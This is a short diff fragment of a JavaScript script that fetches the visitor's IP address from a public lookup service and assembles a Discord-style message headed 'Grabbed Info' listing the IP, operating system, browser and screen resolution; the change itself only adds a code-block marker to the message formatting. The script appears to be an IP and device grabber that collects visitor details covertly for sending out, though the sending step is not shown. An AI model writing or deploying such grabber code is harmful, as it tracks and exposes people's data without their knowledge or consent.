@@ -19,8 +19,9 @@ fetch('https://api.ipify.org/?format=json')
 
     var message = {
       content: 
-               '__**Grabbed Info**__' + '\n' +
-               '```IP: ' + ip + '\n' +
+               '__**Grabbed Info**__' + '\n' + 
+               '```js' + '\n' +
+               'IP: ' + ip + '\n' +
                'Operating System: ' + osName + '\n' +
                'Browser: ' + browser + '\n' +
                'Resolution: ' + resolution + '\n' +
